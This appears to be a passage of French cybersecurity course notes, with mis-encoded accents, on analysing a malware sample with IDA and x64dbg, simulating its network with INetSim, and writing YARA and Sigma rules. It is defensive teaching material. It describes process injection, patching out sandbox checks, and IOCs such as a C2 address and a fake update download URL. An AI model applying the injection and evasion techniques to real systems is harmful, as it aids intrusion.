  * L'Ã©chantillon shell.exe interroge le registre pour dÃ©tecter la prÃ©sence de VMware Tools (indicateur d'un environnement virtuel). Les fonctions **RegOpenKeyExA** et **RegQueryValueExA** dans le dÃ©sassemblage rÃ©vÃ¨lent la dÃ©tection de sandbox basÃ©e sur le registre.
  * IDA montre le chemin de la fonction :

    ```
    lea rdx, aSoftwareVmware
    mov rcx, 0FFFFFFFF80000002h
    call cs:RegOpenKeyExA
    ```
  * **IOC possible** : ClÃ© de registre **SOFTWARE\VMware, Inc.\VMware Tools**.

* **MÃ©canismes de temporisation** :

  * Les appels Ã  **GetSystemTimeAsFileTime**, **GetCurrentProcessId**, et **QueryPerformanceCounter** peuvent indiquer des mÃ©canismes de temporisation, potentiellement utilisÃ©s pour des dÃ©lais ou des vÃ©rifications.
  * IDA affiche Ã©galement des instructions de sommeil ou des boucles de retard utilisÃ©es par le malware pour Ã©viter la dÃ©tection.

* **Connexions rÃ©seau** :

  * L'Ã©chantillon shell.exe utilise **getaddrinfo** et **WSAStartup** pour les opÃ©rations rÃ©seau. Il peut vÃ©rifier la connectivitÃ© rÃ©seau pour Ã©viter les restrictions de la sandbox.
  * **IOC exemple** : Domaine **iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com**.

* **MÃ©canismes de persistance** :

  * L'Ã©chantillon Ã©crit des entrÃ©es dans la clÃ© de registre **SOFTWARE\Microsoft\Windows\CurrentVersion\Run** pour assurer la persistance.
  * **IOC potentiel** : ClÃ© de registre avec l'entrÃ©e pour **svchost.exe** sous **WindowsUpdater**.

* **Injection de processus** :

  * shell.exe crÃ©e un processus **notepad.exe**, alloue de la mÃ©moire Ã  l'intÃ©rieur de ce dernier via **VirtualAllocEx**, puis injecte du shellcode en utilisant **WriteProcessMemory**, suivi de l'appel Ã  **CreateRemoteThread**.
  * Fonctions d'injection observÃ©es :

    ```
    call VirtualAllocEx
    call WriteProcessMemory
    call CreateRemoteThread
    ```

### Utilisation des Graphes de Flux de Fonction et des Xref dans IDA

* **GÃ©nÃ©ration d'un graphe de flux d'appel de fonction** :

  * IDA peut visualiser les relations entre fonctions via **View â†’ Graphs â†’ Function calls**.
  * Graphes spÃ©cifiques aux fonctions : Faire un clic droit dans la vue de dÃ©sassemblage, puis sÃ©lectionner soit **Xrefs graph to...** ou **Xrefs graph from...** pour voir les appels de fonction spÃ©cifiques.

### StratÃ©gie de DÃ©bogage pour shell.exe

* **Placer des points d'arrÃªt** :

  * Ajouter des points d'arrÃªt sur des appels d'API clÃ©s (par exemple, **RegOpenKeyExA**, **VirtualAllocEx**).
* **ContrÃ´le du flux d'exÃ©cution** :

  * Passer Ã©tape par Ã©tape dans le code pour observer le comportement en temps rÃ©el et valider les vÃ©rifications de sandbox ou les mÃ©canismes de persistance suspectÃ©s.
* **Analyse dynamique post-dÃ©sassemblage** :

  * Le dÃ©bogage aprÃ¨s le dÃ©sassemblage permet de valider les conclusions initiales et de confirmer les comportements associÃ©s aux IOCs.

### IOCs IdentifiÃ©s

* **DÃ©tection de sandbox basÃ©e sur le registre** :

  * ClÃ© de registre : **SOFTWARE\VMware, Inc.\VMware Tools**.

* **VÃ©rification de la connectivitÃ© rÃ©seau** :

  * Domaine : **iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com**.
  * Adresse IP : **45.33.32.156**.
  * Port : **31337**.

* **Technique de persistance** :

  * ClÃ© de registre : **SOFTWARE\Microsoft\Windows\CurrentVersion\Run**.
  * ExÃ©cutable : **svchost.exe** dans le rÃ©pertoire **TEMP**.

* **Ressource rÃ©seau externe** :

  * URL : **http\[:]//ms-windows-update\[.]com/svchost\[.]exe**.

```

## **Debugging**

```jsx
### DÃ©bogage dans l'Analyse de Malware

Le dÃ©bogage est une approche interactive de l'analyse de malware qui permet d'examiner le comportement du code en temps rÃ©el. En combinant les informations obtenues via des outils d'analyse statique comme IDA avec des techniques de dÃ©bogage, les analystes peuvent obtenir une vue d'ensemble du fonctionnement du malware, des mÃ©canismes d'Ã©vasion de sandbox et des indicateurs de compromission (IOCs).

---

### **Outils de DÃ©bogage**

#### **x64dbg**

x64dbg est un dÃ©bogueur permettant l'analyse et le contrÃ´le d'exÃ©cutables 64 bits. Il offre plusieurs fonctionnalitÃ©s utiles :

* **Vue de dÃ©sassemblage** : Affiche le code assembleur du programme.
* **Vue des registres et de la pile** : Montre les valeurs actuelles des registres CPU et la pile d'appel.
* **Dump mÃ©moire** : Visualise la mÃ©moire du programme pour analyser les structures de donnÃ©es et les variables.

#### **INetSim**

INetSim permet de simuler des services internet dans un environnement contrÃ´lÃ©, permettant au malware d'interagir avec des services fictifs (DNS, HTTP, etc.) sans risques. Cela permet de reproduire des environnements d'exploitation rÃ©seau sans danger.

---

### **Configurer le DÃ©bogage avec x64dbg**

#### **Charger shell.exe dans x64dbg**

1. Lancez **x64dbg** et sÃ©lectionnez **Fichier > Ouvrir**.
2. Naviguez jusqu'Ã  **shell.exe** et ouvrez-le.
3. Le programme s'arrÃªte Ã  son point d'entrÃ©e dans la vue de dÃ©sassemblage, avec un point d'arrÃªt par dÃ©faut.
4. Pour commencer l'exÃ©cution, appuyez sur **F9** ou cliquez sur **Run**.

#### **Simuler des Services Internet avec INetSim**

INetSim permet de configurer des services internet fictifs, capturant et rÃ©pondant aux requÃªtes rÃ©seau du malware.

##### **Configurer INetSim**

1. **Ã‰diter la configuration** :

   ```bash
   sudo nano /etc/inetsim/inetsim.conf
   ```

   * RÃ©glez `service_bind_address` et `dns_default_ip` sur l'adresse IP de la machine.
   * Configurez les valeurs DNS par dÃ©faut :

     ```bash
     dns_default_hostname www
     dns_default_domainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
     ```

2. **Lancer INetSim** :

   ```bash
   sudo inetsim
   ```

   Assurez-vous que le DNS de la cible pointe vers la machine oÃ¹ INetSim est en cours d'exÃ©cution.

---

### **Contourner les VÃ©rifications de Sandbox**

Les malwares vÃ©rifient souvent s'ils sont exÃ©cutÃ©s dans un environnement virtuel ou de sandbox avant de s'exÃ©cuter pleinement. Voici comment contourner ces vÃ©rifications dans **x64dbg**.

#### **Ã‰tapes pour Contourner les VÃ©rifications de Sandbox**

1. **Copier l'adresse depuis IDA** :

   * Dans **IDA**, identifiez l'adresse de l'instruction `cmp` pour les vÃ©rifications du registre.
   * Utilisez **Go to > Expression** dans **x64dbg** (Ctrl+G) pour localiser cette adresse.

2. **Identifier et patcher l'instruction de comparaison** :

   * Trouvez l'instruction `cmp` liÃ©e Ã  la dÃ©tection de Sandbox (par exemple, Ã  l'adresse **0x4032C8**).
   * Modifiez `cmp [rsp+148h+Type], 1` en `cmp [rsp+148h+Type], 0` en utilisant la barre d'espace pour Ã©diter.

3. **Patch des chaÃ®nes liÃ©es au Sandbox** :

   * Recherchez **> Current Module > String references** pour trouver **Sandbox detected**.
   * DÃ©finissez des points d'arrÃªt sur des chaÃ®nes comme **0x4032F13**, puis modifiez les sauts conditionnels (par exemple, changez **je** en **jne**).

#### **Patch et Sauvegarde de l'ExÃ©cutable ModifiÃ©**

Une fois le patch appliquÃ© :

1. **Sauvegarder l'exÃ©cutable modifiÃ©** :

   * Appuyez sur **Ctrl+P** dans x64dbg et sÃ©lectionnez **Patch File**.

L'exÃ©cutable modifiÃ© contournera dÃ©sormais les vÃ©rifications de sandbox et permettra d'observer tous les comportements du malware.

---

### **Analyse du Trafic RÃ©seau**

#### **Capturer le Trafic du Malware avec Wireshark**

1. Lancez **Wireshark** pour capturer tout le trafic rÃ©seau gÃ©nÃ©rÃ© par le malware.
2. Analysez :

   * **RequÃªtes DNS** : Observez les connexions vers des domaines comme **ms-windows-update\[.]com**.
   * **RequÃªtes HTTP** : Le malware peut ajouter le nom d'hÃ´te de l'ordinateur dans l'User-Agent.
   * **RÃ©ponses HTTP** : Les rÃ©ponses d'INetSim, comme un fichier binaire par dÃ©faut, peuvent dÃ©clencher des messages dans le malware.

---

### **Analyse de l'Injection de Processus**

L'injection de processus est une technique courante oÃ¹ le malware injecte du code dans un autre processus (par exemple, **notepad.exe**).

#### **Configurer des Points d'ArrÃªt pour les Fonctions d'Injection**

1. **Dans x64dbg** :

   * Recherchez et dÃ©finissez des points d'arrÃªt sur **VirtualAllocEx**, **WriteProcessMemory** et **CreateRemoteThread**.

2. **Attacher Ã  notepad.exe** :

   * Ouvrez une autre instance de **x64dbg**, puis attachez-vous au processus **notepad.exe** (Alt+A).
   * Surveillez le code injectÃ© dans la mÃ©moire de **notepad.exe** en utilisant les dumps mÃ©moire.

3. **VÃ©rifier l'injection de Shellcode** :

   * Examinez le paramÃ¨tre `lpBaseAddress` de **WriteProcessMemory** pour identifier l'adresse de l'injection.
   * Copiez et collez cette adresse dans la vue du dump mÃ©moire de **notepad.exe**.

4. **Inspecter le Shellcode InjectÃ©** :

   * ExÃ©cutez **shell.exe**, observez la mÃ©moire peuplÃ©e, puis sauvegardez le shellcode pour une analyse plus approfondie.

---

```

## **Creating Detection Rules**

```jsx
### DÃ©tection de Malware avec des RÃ¨gles YARA et Sigma

La dÃ©tection de malware implique la crÃ©ation de rÃ¨gles permettant d'identifier des comportements malveillants Ã  travers lâ€™analyse de fichiers ou des journaux dâ€™activitÃ©s. Deux outils puissants pour cela sont **YARA** (pour la dÃ©tection basÃ©e sur les fichiers) et **Sigma** (pour la dÃ©tection basÃ©e sur les journaux dans les systÃ¨mes SIEM). Voici un guide structurÃ© pour crÃ©er des rÃ¨gles de dÃ©tection pour un Ã©chantillon de malware.

---

### **RÃ¨gles YARA**

YARA est un outil de correspondance de modÃ¨les basÃ© sur des rÃ¨gles, conÃ§u pour identifier des motifs spÃ©cifiques dans des fichiers. En crÃ©ant des rÃ¨gles YARA personnalisÃ©es, on peut dÃ©tecter efficacement certaines caractÃ©ristiques dans les fichiers, telles que des chaÃ®nes de caractÃ¨res, des sÃ©quences d'octets ou d'autres marqueurs uniques qui sont indicatifs du comportement d'un malware.

#### **Exemple de RÃ¨gle YARA de Base**

Voici un exemple simple de rÃ¨gle YARA pour dÃ©tecter le message **"Sandbox detected"** dans un Ã©chantillon de malware, comme `shell.exe` :

```yara
rule Shell_Sandbox_Detection {
    strings:
        $sandbox_string = "Sandbox detected"
    condition:
        $sandbox_string
}
```

Cette rÃ¨gle recherche la chaÃ®ne **"Sandbox detected"** dans un fichier, et si elle est trouvÃ©e, une alerte est dÃ©clenchÃ©e.

#### **CrÃ©ation de RÃ¨gles YARA AmÃ©liorÃ©es avec yarGen**

Pour des rÃ¨gles plus avancÃ©es, nous pouvons utiliser **yarGen**, un outil qui automatise la crÃ©ation de rÃ¨gles YARA en extrayant des chaÃ®nes uniques et des motifs d'un Ã©chantillon donnÃ©.

##### **Ã‰tapes pour GÃ©nÃ©rer des RÃ¨gles avec yarGen :**

1. **PrÃ©parer le RÃ©pertoire de Test** :
   CrÃ©ez un rÃ©pertoire et copiez lâ€™Ã©chantillon de malware (par exemple, `shell.exe`) dedans :

   ```bash
   mkdir /home/htb-student/Samples/MalwareAnalysis/Test
   cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/
   ```

2. **ExÃ©cuter yarGen** :
   Allez dans le rÃ©pertoire de yarGen et exÃ©cutez la commande suivante :

   ```bash
   cd /home/htb-student/yarGen-0.23.4
   sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/
   ```

   Cela gÃ©nÃ¨re un fichier de rÃ¨gles YARA (`yargen_rules.yar`) contenant les motifs uniques de `shell.exe`.

##### **Exemple de RÃ¨gle GÃ©nÃ©rÃ©e** :

Voici un exemple de rÃ¨gle YARA gÃ©nÃ©rÃ©e par yarGen :

```yara
rule _home_htb_student_Samples_MalwareAnalysis_Test_shell {
   meta:
      description = "Test - fichier shell.exe"
      author = "yarGen Rule Generator"
      date = "2023-08-02"
      hash1 = "bd841e796feed0088ae670284ab991f212cf709f2391310a85443b2ed1312bda"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $s2 = "http://ms-windows-update.com/svchost.exe" fullword ascii
      $s3 = "45.33.32.156" fullword ascii
      $s4 = "[-] Error code is : %lu" fullword ascii
      $s5 = "Connection sent to C2" fullword ascii
      $s6 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and 3 of ($s*)
}
```

#### **Utilisation de la RÃ¨gle pour la DÃ©tection** :

Pour utiliser cette rÃ¨gle pour la dÃ©tection, exÃ©cutez la commande suivante :

```bash
yara /home/htb-student/yarGen-0.23.4/yargen_rules.yar /home/htb-student/Samples/MalwareAnalysis/
```

La sortie devrait confirmer la dÃ©tection si `shell.exe` est prÃ©sent dans le rÃ©pertoire spÃ©cifiÃ©.

---

### **RÃ¨gles Sigma**

Sigma est un format de rÃ¨gle pour la dÃ©tection des menaces de sÃ©curitÃ© dans les systÃ¨mes SIEM. Les rÃ¨gles Sigma standardisent la dÃ©tection Ã  travers diffÃ©rentes plateformes, permettant ainsi de dÃ©tecter des motifs ou Ã©vÃ©nements malveillants en analysant les journaux.

#### **Exemple de RÃ¨gle Sigma de Base**

Voici un exemple de rÃ¨gle Sigma pour dÃ©tecter un fichier nommÃ© **svchost.exe** dÃ©posÃ© dans le dossier **Temp** :

```yaml
title: DÃ©pÃ´t de fichier suspect dans le dossier Temp de l'utilisateur
status: experimental
description: DÃ©tecte l'activitÃ© suspecte oÃ¹ un fichier est dÃ©posÃ© dans le dossier temp

logsource:
    category: process_creation
detection:
    selection:
        TargetFilename:
            - '*\\AppData\\Local\\Temp\\svchost.exe'
    condition: selection
    level: high

falsepositives:
    - DÃ©pÃ´ts lÃ©gitimes de fichiers exe dans le dossier temp
```

#### **Exemple de RÃ¨gle de DÃ©tection avec les Logs Sysmon**

Sysmon fournit des journaux dÃ©taillÃ©s sur les processus, fichiers et connexions rÃ©seau, qui peuvent Ãªtre utilisÃ©s pour crÃ©er des rÃ¨gles Sigma plus complexes. Exemple de rÃ¨gle pour la crÃ©ation d'un processus en rÃ©ponse au comportement de `shell.exe` :

**RÃ¨gle Sysmon - CrÃ©ation de Processus** :

```yaml
title: CrÃ©ation de processus suspecte pour modification de registre
logsource:
   category: process_creation
   product: windows
detection:
   selection:
      Image: 'C:\\Windows\\System32\\cmd.exe'
      CommandLine: '*ping 127.0.0.1 -n 5*'
   condition: selection
level: high
description: DÃ©tecte la crÃ©ation de processus avec des arguments de ligne de commande liÃ©s Ã  des commandes de dÃ©lai ou de pause
```

**RÃ¨gle Sysmon - Connexion RÃ©seau** :

```yaml
title: Connexion rÃ©seau suspecte Ã  une IP de serveur C2
logsource:
   category: network_connection
   product: windows
detection:
   selection:
      DestinationIp: '45.33.32.156'
      DestinationPort: 31337
   condition: selection
level: high
description: DÃ©tecte les connexions rÃ©seau vers une IP de serveur C2 connue
```

---

### **Ressources**

#### **YARA** :

* Documentation : [YARA Documentation](https://virustotal.github.io/yara/)
* RÃ¨gles communautaires : [InQuestâ€™s Awesome YARA](https://github.com/InQuest/awesome-yara)

#### **Sigma** :

* Documentation : [Sigma Specification](https://github.com/Neo23x0/sigma)
* RÃ¨gles communautaires : [SigmaHQ Rules](https://github.com/SigmaHQ/sigma)

#### **RÃ©fÃ©rences et Ressources ComplÃ©mentaires** :

* Documentation YARA : [YARA Rules](https://virustotal.github.io/yara/)
* Documentation Sigma : [Sigma Rules](https://github.com/Neo23x0/sigma)
* DFIR Report : [YARA et Sigma Rules par DFIR](https://www.dfirreport.com/)

---

```

## **JavaScript Deobfuscation**

## Outils

```jsx

---

## ğŸ› ï¸ Outils UtilisÃ©s

| **Outil**                                                                                                | **Cas dâ€™usage**                                                                                                        |
| -------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| [https://jsconsole.com](https://jsconsole.com)                                                           | Tester du code JavaScript en ligne, exÃ©cuter rapidement des scripts dans un environnement de console.                  |
| [https://javascript-minifier.com/](https://javascript-minifier.com/)                                     | Minification du code : transforme le code JavaScript en une seule ligne compacte pour le rendre plus difficile Ã  lire. |
| [http://beautifytools.com/javascript-obfuscator.php](http://beautifytools.com/javascript-obfuscator.php) | Obfuscation simple ou compression du code pour masquer la logique mÃ©tier.                                              |
| [https://obfuscator.io/](https://obfuscator.io/)                                                         | Obfuscation avancÃ©e avec plusieurs niveaux de protection et options de configuration.                                  |
| [https://beautifier.io/](https://beautifier.io/)                                                         | RÃ©indente et reformate du code JavaScript compactÃ© ou difficile Ã  lire.                                                |
| [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html)                               | DÃ©obfuscation : permet de retrouver une version lisible du code obfusquÃ© ou packÃ© (par exemple via P.A.C.K.E.R).       |

---

```

## **Code Analysis**

```jsx

---

## ğŸ” Analyse de la fonction `generateSerial` dans *secret.js*

La fonction `generateSerial`, prÃ©sente dans le fichier JavaScript `secret.js`, effectue une requÃªte POST vers lâ€™URL `/serial.php` via un objet `XMLHttpRequest`, sans envoyer de donnÃ©es ni traiter de rÃ©ponse. Voici une dÃ©composition complÃ¨te :

---

### ğŸ§  Vue dâ€™ensemble du code

```javascript
'use strict';
function generateSerial() {
  var xhr = new XMLHttpRequest;
  var url = "/serial.php";
  xhr.open("POST", url, true);
  xhr.send(null);
};
```

---

### ğŸ”§ Analyse du code Ã©tape par Ã©tape

#### 1. **Initialisation des variables**

* `xhr` : CrÃ©e un objet `XMLHttpRequest`, utilisÃ© pour effectuer des requÃªtes HTTP en JavaScript.
* `url` : Contient lâ€™URL cible `/serial.php`, situÃ©e sur le mÃªme domaine (car aucune URL complÃ¨te nâ€™est prÃ©cisÃ©e).

#### 2. **Logique de la fonction**

* `xhr.open("POST", url, true)` : PrÃ©pare une requÃªte HTTP de type POST vers `/serial.php`, en mode **asynchrone** (paramÃ¨tre `true`).
* `xhr.send(null)` : Envoie la requÃªte sans donnÃ©es dans le corps â€” câ€™est donc une **requÃªte POST vide**.

#### 3. **Objectif et usage possible**

* Cette fonction semble destinÃ©e Ã  dÃ©clencher un processus cÃ´tÃ© serveur via `/serial.php`, probablement pour **gÃ©nÃ©rer ou vÃ©rifier un numÃ©ro de sÃ©rie**.
* Lâ€™absence de gestion de rÃ©ponse (`xhr.onreadystatechange`, `xhr.responseText`, etc.) et dâ€™interaction avec des Ã©lÃ©ments HTML suggÃ¨re que :

  * La fonction est **incomplÃ¨te** ou en cours de dÃ©veloppement.
  * Ou elle est **prÃ©vue pour Ãªtre appelÃ©e** via un Ã©vÃ©nement, comme un clic sur un bouton Â«â€¯GÃ©nÃ©rer un numÃ©ro de sÃ©rieâ€¯Â».
* Elle ne semble pas activement utilisÃ©e dans lâ€™interface actuelle.

---

### âš ï¸ Implications en matiÃ¨re de sÃ©curitÃ©

Cette fonction pourrait rÃ©vÃ©ler des comportements ou fonctionnalitÃ©s cachÃ©es sur le serveur :

* Le script appelle un **endpoint serveur peu visible** (/serial.php), ce qui peut indiquer un **comportement non documentÃ© ou expÃ©rimental**.
* Il pourrait exister des failles potentielles telles que :

  * **Absence de vÃ©rification des autorisations**
  * **Manque de validation des requÃªtes**
  * **RÃ©ponses contenant des informations sensibles** (ex : messages dâ€™erreur, traces de debug)

---

### âœ… Ã‰tapes suivantes pour lâ€™analyse

1. **Reproduire la requÃªte**
   Utiliser `curl`, Postman ou lâ€™onglet RÃ©seau du navigateur pour envoyer une requÃªte POST vide Ã  `/serial.php`.

   ```bash
   curl -X POST https://example.com/serial.php
   ```

2. **Analyser la rÃ©ponse du serveur**

   * Regarder le **code HTTP** de retour (200, 403, 500, etc.).
   * Examiner les Ã©ventuels **contenus retournÃ©s** : numÃ©ro de sÃ©rie, erreurs, indices sur la logique mÃ©tier.

3. **Ã‰valuer les vulnÃ©rabilitÃ©s potentielles**

   * VÃ©rifier si lâ€™accÃ¨s Ã  `/serial.php` est **protÃ©gÃ©** (authentification, droits).
   * Tester diffÃ©rentes variantes de requÃªtes (POST avec donnÃ©es, GET).
   * Identifier si le serveur **expose des informations sensibles** ou un comportement exploitable.

---

```

## **HTTP Requests**

```jsx

---

## ğŸŒ Bases de cURL

### âœ… RequÃªte GET simple

Pour rÃ©cupÃ©rer le contenu d'une page web, il suffit de spÃ©cifier lâ€™URL avec la commande `curl` :

```bash
curl http://ADRESSE_DU_SERVEUR:PORT/
```

#### ğŸ“„ Exemple de sortie :

```html
</html>
<!DOCTYPE html>
<head>
    <title>Secret Serial Generator</title>
    ...
    <h1>Secret Serial Generator</h1>
    <p>This page generates secret serials!</p>
</div>
</body>
</html>
```

Ce rÃ©sultat correspond au **code source HTML** visible dans lâ€™inspecteur du navigateur.

---

### ğŸ“¬ RequÃªte POST simple

Pour envoyer une requÃªte POST (comme le fait la fonction `generateSerial`), on utilise lâ€™option `-X POST` :

```bash
curl -s http://ADRESSE_DU_SERVEUR:PORT/ -X POST
```

* `-s` active le **mode silencieux**, qui masque les messages de progression ou dâ€™erreur pour nâ€™afficher que le contenu de la rÃ©ponse.

---

### ğŸ“¤ RequÃªte POST avec des donnÃ©es

En gÃ©nÃ©ral, une requÃªte POST inclut des **donnÃ©es** dans le corps de la requÃªte. Pour cela, on utilise lâ€™option `-d` :

```bash
curl -s http://ADRESSE_DU_SERVEUR:PORT/ -X POST -d "param1=exemple"
```

---

## ğŸ” Ã‰tapes suivantes

Dans la suite de lâ€™analyse, nous allons simuler **exactement** la requÃªte POST vers `/serial.php` comme dÃ©finie dans la fonction `generateSerial`.
MÃªme si celle-ci ne transmet pas de donnÃ©es, on peut utiliser `curl` pour explorer les **rÃ©ponses potentielles du serveur**, et ainsi mieux comprendre le fonctionnement de cet endpoint.

```

## **Decoding**

```jsx

---

## ğŸ” Techniques d'encodage courantes

Lâ€™encodage est souvent utilisÃ© pour dissimuler ou transformer des donnÃ©es dans un format diffÃ©rent. Voici les mÃ©thodes d'encodage les plus frÃ©quemment rencontrÃ©es lors dâ€™analyses de sÃ©curitÃ© ou de dÃ©codage d'informations cachÃ©es.

---

### ğŸ§¾ Encodage Base64

* **But** : Convertit des donnÃ©es en un format alphanumÃ©rique lisible, avec les caractÃ¨res `+` et `/`, et un ou plusieurs `=` comme **remplissage** pour que la longueur soit un multiple de 4.
* **Comment le repÃ©rer** : ComposÃ© de lettres majuscules/minuscules, de chiffres, souvent avec `/`, `+`, et se terminant par `=`.

#### â• Encodage :

```bash
echo "https://www.hackthebox.eu/" | base64
```

#### â– DÃ©codage :

```bash
echo "aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K" | base64 -d
```

#### ğŸ¯ Exemple :

```bash
echo "ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=" | base64 -d
```

Ce code se dÃ©code en :
**"do the exercise, don't copy and paste ;)"**

---

### ğŸ”¢ Encodage HexadÃ©cimal (Hex)

* **But** : ReprÃ©sente chaque caractÃ¨re par sa valeur ASCII en hexadÃ©cimal.
* **Comment le repÃ©rer** : Ne contient que des caractÃ¨res de `0-9` et `a-f`.

#### â• Encodage :

```bash
echo "https://www.hackthebox.eu/" | xxd -p
```

#### â– DÃ©codage :

```bash
echo "68747470733a2f2f7777772e6861636b746865626f782e65752f0a" | xxd -p -r
```

---

### ğŸ” Chiffrement CÃ©sar / ROT13

* **But** : DÃ©cale chaque lettre de lâ€™alphabet dâ€™un nombre fixe (par exemple, ROT13 = dÃ©calage de 13 positions).
* **Comment le repÃ©rer** : Les caractÃ¨res restent lisibles, seul leur ordre change. Le texte garde une **structure alphabÃ©tique reconnaissable**.

#### ğŸ”ƒ Encodage / DÃ©codage avec ROT13 (rÃ©versible) :

```bash
echo "https://www.hackthebox.eu/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

#### ğŸ”„ Pour dÃ©coder (mÃªme commande) :

```bash
echo "uggcf://jjj.unpxgurobk.rh/" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

### ğŸ•µï¸ Identifier le type d'encodage

Pour des chaÃ®nes ambiguÃ«s, des outils en ligne comme **Cipher Identifier** (par exemple : dcode.fr ou CyberChef) peuvent aider Ã  dÃ©tecter le type d'encodage automatiquement.

---

### ğŸ” Encodage avancÃ© vs chiffrement

* **Encodage** : Change le format des donnÃ©es pour des raisons techniques (lisibilitÃ©, compatibilitÃ©) â€” pas sÃ©curisÃ©.
* **Chiffrement** : Transforme les donnÃ©es de maniÃ¨re **incomprÃ©hensible sans clÃ©**, dans un but de **confidentialitÃ©**.

> â— En analyse de malware, tests de sÃ©curitÃ© ou ingÃ©nierie inverse, savoir reconnaÃ®tre et dÃ©coder ces formats permet dâ€™identifier des donnÃ©es dissimulÃ©es ou des comportements suspects.

---

```

## **YARA & Sigma for SOC ANalysts**

## Y**ARA and YARA Rules**

```jsx
### YARA et les RÃ¨gles YARA

YARA est un outil puissant de correspondance de motifs qui permet d'identifier des fichiers en fonction de motifs et de rÃ¨gles spÃ©cifiques. Ces rÃ¨gles permettent aux analystes SOC et aux Ã©quipes de criminalistique de dÃ©tecter, classifier et enquÃªter sur des fichiers suspects et des Ã©chantillons de malwares. Les rÃ¨gles YARA analysent le contenu textuel ou binaire des fichiers et peuvent Ã©galement Ãªtre appliquÃ©es Ã  la mÃ©moire, contribuant ainsi Ã  la dÃ©tection de malwares et Ã  la chasse proactive aux menaces.

---

### Utilisations de YARA

* **DÃ©tection de Malware** : Permet d'identifier les malwares en se basant sur des motifs ou comportements uniques.
* **Classification de Fichiers** : Aide Ã  classer les fichiers par format, version, mÃ©tadonnÃ©es, etc.
* **DÃ©tection des IOCs** : Recherche de l'indicateur de compromission (IOC) dans les fichiers, comme les clÃ©s de registre ou les noms de fichiers.
* **Chasse aux Menaces** : Recherche proactive de menaces dans l'environnement.
* **RÃ©ponse aux Incidents** : Recherche rapide d'artÃ©facts en rÃ©ponse aux incidents de sÃ©curitÃ©.
* **RÃ¨gles PersonnalisÃ©es pour Menaces CiblÃ©es** : CrÃ©ation de rÃ¨gles sur mesure pour rÃ©pondre Ã  des besoins organisationnels spÃ©cifiques.

---

### Comment YARA Fonctionne

* **Jeu de RÃ¨gles** : Les rÃ¨gles dÃ©finissent des motifs ou des comportements Ã  rechercher.
* **Jeu de Fichiers** : Ensemble de fichiers ou de captures mÃ©moire Ã  analyser.
* **Moteur YARA** : Compare le contenu des fichiers octet par octet avec les rÃ¨gles dÃ©finies.
* **Sortie de DÃ©tection** : Si des motifs sont trouvÃ©s, YARA marque le fichier comme dÃ©tectÃ©.

---

### Structure d'une RÃ¨gle YARA

1. **Structure de Base** :

```yara
rule NomDeLaRÃ¨gle {
    meta:
        author = "Nom de l'Auteur"
        description = "Description de la rÃ¨gle"
    strings:
        $string1 = "exemple_texte"
        $string2 = { 4A 2D 1C }
    condition:
        all of them
}
```

2. **Composants d'une RÃ¨gle YARA** :

* **En-tÃªte de RÃ¨gle** : Commence par le mot-clÃ© `rule`, suivi du nom de la rÃ¨gle.
* **Section Meta** : Contient des mÃ©tadonnÃ©es telles que lâ€™auteur, la description, la version et les rÃ©fÃ©rences.
* **Section Strings** : DÃ©finit des chaÃ®nes de texte, des motifs hexadÃ©cimaux ou des expressions rÃ©guliÃ¨res Ã  rechercher.
* **Section Condition** : SpÃ©cifie les conditions sous lesquelles la rÃ¨gle est dÃ©clenchÃ©e.

3. **Exemple de RÃ¨gle â€“ DÃ©tection des ChaÃ®nes de WannaCry** :

```yara
rule Ransomware_WannaCry {
    meta:
        author = "Nom de l'Analyste"
        description = "DÃ©tecte les chaÃ®nes spÃ©cifiques de WannaCry"
    strings:
        $wannacry1 = "tasksche.exe" fullword ascii
        $wannacry2 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" ascii
        $wannacry3 = "mssecsvc.exe" fullword ascii
    condition:
        all of them
}
```

4. **Conditions et OpÃ©rateurs Logiques** :

* **all of them** : Toutes les chaÃ®nes spÃ©cifiÃ©es doivent correspondre.
* **any of them** : N'importe laquelle des chaÃ®nes spÃ©cifiÃ©es peut correspondre.
* **Condition de Taille de Fichier** : VÃ©rifie que la taille du fichier respecte certains critÃ¨res :

```yara
condition:
    filesize < 100KB and uint16(0) == 0x5A4D
```

* **uint16(0) == 0x5A4D** : VÃ©rifie si les deux premiers octets correspondent Ã  0x5A4D (indiquant un en-tÃªte MZ pour les exÃ©cutables).

---

### FonctionnalitÃ©s AvancÃ©es des RÃ¨gles YARA

* **OpÃ©rateurs Logiques** : Permet de combiner les conditions avec `and`, `or`, `not`.
* **Modules Externes** : Ã‰tend la fonctionnalitÃ© des rÃ¨gles pour rÃ©pondre Ã  des besoins spÃ©cifiques.
* **PersonnalisabilitÃ©** : Permet d'adapter les rÃ¨gles en fonction de menaces ou d'indicateurs spÃ©cifiques.

---

```

## **Developing YARA Rules**

```jsx

---

## ğŸ§  Introduction aux RÃ¨gles YARA

YARA est un outil puissant permettant de dÃ©tecter des fichiers malveillants en analysant leur structure et leur contenu. Ce guide prÃ©sente des exemples concrets de dÃ©veloppement de rÃ¨gles YARA pour dÃ©tecter des exÃ©cutables packagÃ©s, des malwares spÃ©cifiques et d'autres comportements suspects.

---

### 1. ğŸ“ **RÃ¨gle YARA de Base pour les Executables PackagÃ©s UPX**

**Analyse de chaÃ®nes :**

```bash
Kailez@htb[/htb]$ strings svchost.exe
```

#### Exemple de rÃ¨gle YARA pour dÃ©tecter des exÃ©cutables packagÃ©s avec UPX :

```yaml
rule UPX_packed_executable {
    meta:
        description = "DÃ©tecte les exÃ©cutables packagÃ©s avec UPX"
    strings:
        $string_1 = "UPX0"
        $string_2 = "UPX1"
        $string_3 = "UPX2"
    condition:
        all of them
}
```

**Explication :**

